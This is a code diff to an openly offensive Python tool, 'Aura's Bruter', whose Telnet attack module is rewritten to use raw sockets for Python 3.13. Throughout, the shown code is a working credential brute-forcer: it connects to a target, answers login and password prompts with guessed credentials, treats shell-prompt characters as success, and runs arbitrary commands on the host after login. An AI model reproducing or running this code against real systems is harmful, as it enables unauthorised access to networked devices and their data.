@@ -1,12 +1,11 @@
 #!/usr/bin/env python3
 """
 Aura's Bruter - Telnet Attack Module
-Telnet brute force using telnetlib
+Telnet brute force using raw sockets (Python 3.13 compatible)
 """
 
-import telnetlib
 import socket
-import re
+import time
 from typing import Optional, Tuple
 from dataclasses import dataclass
 
@@ -23,7 +22,8 @@ class TelnetResult:
 
 class TelnetAttacker:
     """
-    Telnet brute force attack module.
+    Telnet brute force attack module using raw sockets.
+    Compatible with Python 3.13+ (telnetlib was removed).
     """
     
     # Common login/password prompts
@@ -91,24 +91,49 @@ class TelnetAttacker:
         except Exception:
             return False
     
+    def _recv_until(self, sock: socket.socket, patterns: list, timeout: float = 5.0) -> Tuple[bytes, int]:
+        """Receive data until one of the patterns is found."""
+        sock.settimeout(timeout)
+        data = b""
+        start_time = time.time()
+        
+        while time.time() - start_time < timeout:
+            try:
+                chunk = sock.recv(1024)
+                if not chunk:
+                    break
+                data += chunk
+                
+                # Check for patterns
+                for i, pattern in enumerate(patterns):
+                    if pattern.lower() in data.lower():
+                        return data, i
+                        
+            except socket.timeout:
+                break
+            except Exception:
+                break
+        
+        return data, -1
+    
     def get_banner(self) -> Optional[str]:
         """Get the Telnet server banner."""
         if self._banner:
             return self._banner
         
         try:
-            tn = telnetlib.Telnet(self.host, self.port, timeout=self.timeout)
-            # Read until we get a login prompt or timeout
-            data = tn.read_until(b":", timeout=self.timeout)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(self.timeout)
+            sock.connect((self.host, self.port))
+            
+            # Read initial data
+            data, _ = self._recv_until(sock, self.LOGIN_PROMPTS, timeout=self.timeout)
             self._banner = data.decode('utf-8', errors='ignore').strip()
-            tn.close()
+            
+            sock.close()
             return self._banner
         except Exception:
             return None
-    
-    def _wait_for_prompt(self, tn: telnetlib.Telnet, prompts: list, timeout: float = 5.0) -> Tuple[int, bytes]:
-        """Wait for any of the given prompts."""
-        return tn.expect(prompts, timeout=timeout)
     
     def try_credentials(self, username: str, password: str) -> TelnetResult:
         """
@@ -122,14 +147,17 @@ class TelnetAttacker:
             TelnetResult with success status and details
         """
         for attempt in range(self.max_retries):
+            sock = None
             try:
-                tn = telnetlib.Telnet(self.host, self.port, timeout=self.timeout)
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(self.timeout)
+                sock.connect((self.host, self.port))
                 
                 # Wait for login prompt
-                idx, match, data = self._wait_for_prompt(tn, self.LOGIN_PROMPTS, timeout=self.timeout)
+                data, idx = self._recv_until(sock, self.LOGIN_PROMPTS, timeout=self.timeout)
                 
                 if idx < 0:
-                    tn.close()
+                    sock.close()
                     if attempt < self.max_retries - 1:
                         continue
                     return TelnetResult(
@@ -140,13 +168,14 @@ class TelnetAttacker:
                     )
                 
                 # Send username
-                tn.write(username.encode('utf-8') + b"\n")
+                sock.send(username.encode('utf-8') + b"\r\n")
+                time.sleep(0.3)
                 
                 # Wait for password prompt
-                idx, match, data = self._wait_for_prompt(tn, self.PASSWORD_PROMPTS, timeout=self.timeout)
+                data, idx = self._recv_until(sock, self.PASSWORD_PROMPTS, timeout=self.timeout)
                 
                 if idx < 0:
-                    tn.close()
+                    sock.close()
                     return TelnetResult(
                         success=False,
                         username=username,
@@ -155,13 +184,25 @@ class TelnetAttacker:
                     )
                 
                 # Send password
-                tn.write(password.encode('utf-8') + b"\n")
+                sock.send(password.encode('utf-8') + b"\r\n")
+                time.sleep(0.5)
                 
                 # Check response
-                response = tn.read_until(b"\n", timeout=self.timeout)
-                response += tn.read_very_eager()
+                try:
+                    sock.settimeout(2.0)
+                    response = b""
+                    while True:
+                        try:
+                            chunk = sock.recv(1024)
+                            if not chunk:
+                                break
+                            response += chunk
+                        except socket.timeout:
+                            break
+                except Exception:
+                    pass
                 
-                tn.close()
+                sock.close()
                 
                 # Check for failure patterns first
                 for pattern in self.FAILURE_PATTERNS:
@@ -183,7 +224,18 @@ class TelnetAttacker:
                             banner=self._banner
                         )
                 
-                # If we got here without explicit failure, consider it failed
+                # If no login prompt again, might be success
+                has_login_prompt = any(p.lower() in response.lower() for p in self.LOGIN_PROMPTS)
+                if not has_login_prompt and len(response) > 0:
+                    # Check if we got a shell prompt
+                    if b"$" in response or b"#" in response or b">" in response:
+                        return TelnetResult(
+                            success=True,
+                            username=username,
+                            password=password,
+                            banner=self._banner
+                        )
+                
                 return TelnetResult(
                     success=False,
                     username=username,
@@ -192,6 +244,8 @@ class TelnetAttacker:
                 )
                 
             except socket.timeout:
+                if sock:
+                    sock.close()
                 if attempt < self.max_retries - 1:
                     continue
                 return TelnetResult(
@@ -202,6 +256,8 @@ class TelnetAttacker:
                 )
                 
             except socket.error as e:
+                if sock:
+                    sock.close()
                 if attempt < self.max_retries - 1:
                     continue
                 return TelnetResult(
@@ -212,6 +268,8 @@ class TelnetAttacker:
                 )
                 
             except Exception as e:
+                if sock:
+                    sock.close()
                 return TelnetResult(
                     success=False,
                     username=username,
@@ -233,31 +291,46 @@ class TelnetAttacker:
         Returns:
             Command output or None if failed
         """
+        sock = None
         try:
-            tn = telnetlib.Telnet(self.host, self.port, timeout=self.timeout)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(self.timeout)
+            sock.connect((self.host, self.port))
             
             # Login
-            tn.read_until(b"login:", timeout=self.timeout)
-            tn.write(username.encode('utf-8') + b"\n")
+            self._recv_until(sock, self.LOGIN_PROMPTS, timeout=self.timeout)
+            sock.send(username.encode('utf-8') + b"\r\n")
             
-            tn.read_until(b"Password:", timeout=self.timeout)
-            tn.write(password.encode('utf-8') + b"\n")
+            self._recv_until(sock, self.PASSWORD_PROMPTS, timeout=self.timeout)
+            sock.send(password.encode('utf-8') + b"\r\n")
             
             # Wait for shell prompt
-            tn.read_until(b"$", timeout=self.timeout)
+            time.sleep(1)
             
             # Send command
-            tn.write(command.encode('utf-8') + b"\n")
+            sock.send(command.encode('utf-8') + b"\r\n")
+            time.sleep(1)
             
             # Read response
-            response = tn.read_until(b"$", timeout=self.timeout)
+            response = b""
+            sock.settimeout(2.0)
+            while True:
+                try:
+                    chunk = sock.recv(1024)
+                    if not chunk:
+                        break
+                    response += chunk
+                except socket.timeout:
+                    break
             
-            tn.write(b"exit\n")
-            tn.close()
+            sock.send(b"exit\r\n")
+            sock.close()
             
             return response.decode('utf-8', errors='ignore')
             
         except Exception:
+            if sock:
+                sock.close()
             return None
     
     def get_server_info(self) -> dict:
@@ -277,6 +350,7 @@ if __name__ == "__main__":
     console = Console()
     
     console.print("[yellow]Telnet Attack Module - Demo Mode[/yellow]")
+    console.print("[dim]Python 3.13+ compatible (uses raw sockets)[/dim]")
     
     table = Table(title="TelnetAttacker Methods")
     table.add_column("Method", style="cyan")
